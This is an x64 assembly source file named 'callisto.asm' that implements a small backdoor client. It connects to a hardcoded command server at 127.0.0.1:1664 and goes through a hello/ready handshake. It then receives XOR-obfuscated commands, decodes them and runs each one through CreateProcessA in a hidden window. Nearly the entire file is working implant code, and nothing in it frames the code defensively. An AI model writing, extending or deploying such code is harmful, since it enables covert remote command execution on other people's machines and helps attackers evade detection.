;  <callisto.asm>   -   Callisto source
;                         Copyright (c) 2020 by Joshua Finley.
;

option win64:3      ; init shadow space, reserve stack at PROC level

include ..\include\kernel32.inc
include ..\include\winsock.inc
include ..\include\ntdll.inc

; Shellcode commands
buffer_size     equ 1024
cmd_null        equ 0000b
cmd_hello       equ 0001b
cmd_ready       equ 0010b
cmd_exec        equ 0100b
cmd_exit        equ 1000b

; Function prototypes
xor_cipher proto    fastcall :qword, :byte, :dword
system_exec proto   fastcall :qword

_data$00 segment page 'data'
    g_command_ip        db "127.0.0.1", 0
    g_command_port      dw 1664
    g_comspec           db "COMSPEC", 0
_data$00 ends

_text$00 segment align(10h) 'code'

    main proc
        local socket_buffer[buffer_size]:byte
        local wsa_data:wsadata
        local sock_addr:sockaddr_in
        local dw_socket:dword
        local dw_socket_buffer_size:dword
        local cipher_key:byte
        ; Initialize Winsock
        invoke WSAStartup, 516, addr wsa_data
        test eax, eax
        jnz _exit
        
        ; Create a socket
        invoke socket, af_inet, sock_stream, ipproto_tcp
        cmp eax, socket_error
        je _exit
        mov dw_socket, eax

        ; Setup connection information
        invoke RtlZeroMemory, addr sock_addr, sizeof sockaddr_in
        invoke inet_addr, addr g_command_ip
        mov sock_addr.sin_addr, eax
        mov sock_addr.sin_family, af_inet
        invoke htons, g_command_port
        mov sock_addr.sin_port, ax

        ; Connect to command server 
        invoke connect, dw_socket, addr sock_addr, sizeof sock_addr
        cmp eax, socket_error
        je _exit

        ; Send the client hello
        invoke RtlZeroMemory, addr socket_buffer, buffer_size
        mov byte ptr [socket_buffer], cmd_hello
        invoke send, dw_socket, addr socket_buffer, sizeof byte, 0

        ; Check server hello
        invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
        cmp eax, socket_error
        je _exit
        cmp byte ptr [socket_buffer], cmd_hello
        jne _exit

        ; Successfuly connected to command server; await commands
        .while 1
            ; Signal the client is ready
            invoke RtlZeroMemory, addr socket_buffer, buffer_size
            mov byte ptr [socket_buffer], cmd_ready
            invoke send, dw_socket, addr socket_buffer, sizeof byte, 0

            ; Check if the server is ready
            mov byte ptr [socket_buffer], 0
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            cmp byte ptr [socket_buffer], cmd_ready
            
            ; If nothing sent
            .if eax == 0
                .continue   
            .elseif byte ptr [socket_buffer] == cmd_exit ; exit now
                jmp _exit
            .elseif byte ptr [socket_buffer] != cmd_exec ; otherwise, wait until exec command
                .continue
            .endif

            ; Receive the next cipher key
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            cmp eax, socket_error
            je _exit
            mov al, byte ptr [socket_buffer]
            mov [cipher_key], al

            ; Receive the next command
            invoke recv, dw_socket, addr socket_buffer, buffer_size, 0
            cmp eax, socket_error
            je _exit

            ; Continue if the server has nothing for the client
            .if eax == 0
                .continue
            .endif

            ; Save the size of the last command
            mov dw_socket_buffer_size, eax
            
            ; Check if exit command was sent
            mov al, byte ptr [socket_buffer]
            cmp al, cmd_exit
            je _exit

            ; Decipher the supplied command
            invoke xor_cipher, addr socket_buffer, cipher_key, buffer_size

            ; Run the supplied command and clear the buffer
            invoke system_exec, addr socket_buffer
            invoke RtlZeroMemory, addr socket_buffer, buffer_size
        .endw

    _exit:
        invoke WSACleanup
        ret
    main endp

    xor_cipher proc fastcall uses rax rbx rdx r8, buffer_addr:qword, key:byte, xor_buffer_size:dword
        mov dl, key                 ; Move the XOR key into rdx
        mov r8d, xor_buffer_size    ; Move the size into r8 (loop counter)
        
    _xor_next_byte:
        lea rbx, [rcx + r8 - 1]     ; Load effective address of the current byte
        xor rax, rax                ; Clear rax (ensure only lower 8 bits are used)
        movzx rax, byte ptr [rbx]   ; Move the byte into al, zero-extending to rax
        xor al, dl                  ; XOR the byte with the key
        mov [rbx], al               ; Store the result back into the buffer
        dec r8                      ; Decrement the loop counter
        jne _xor_next_byte          ; Jump if there are more bytes to process
        ret
    xor_cipher endp

    system_exec proc fastcall uses rax rcx r8, command_buffer:qword
            local comspec_path[max_path]:byte
            local startup_info:startupinfoa
            local process_info:process_information

            ; Initialize process info handles to invalid values (for checks in _error)
            mov process_info.hThread, -1
            mov process_info.hProcess, -1

            ; Initialize the local structures to zero
            invoke RtlZeroMemory, addr startup_info, sizeof startup_info
            invoke RtlZeroMemory, addr process_info, sizeof process_info

            ; Get path of command line interpreter
            invoke GetEnvironmentVariableA, addr g_comspec, addr comspec_path, max_path
            test eax, eax
            je _error

            ; Prepare startupinfo structure
            mov startup_info.cbsize, sizeof startupinfoa
            mov startup_info.dwflags, startf_swind
            mov startup_info.wShowWindow, sw_hide

            ; Create the process
            invoke CreateProcessA, 0, command_buffer, 0, 0, 0, 0, 0, 0, addr startup_info, addr process_info
            test eax, eax
            je _error

            mov eax, 0
            jmp _exit

        _error:
            mov eax, -1
        _exit:
            ; If the handles are open, close them
            .if process_info.hProcess != -1 && process_info.hProcess != 0
                invoke CloseHandle, process_info.hProcess
            .endif
            .if process_info.hThread != -1 && process_info.hThread != 0
                invoke CloseHandle, process_info.hThread
            .endif


            ret
    system_exec endp

_text$00 ends

end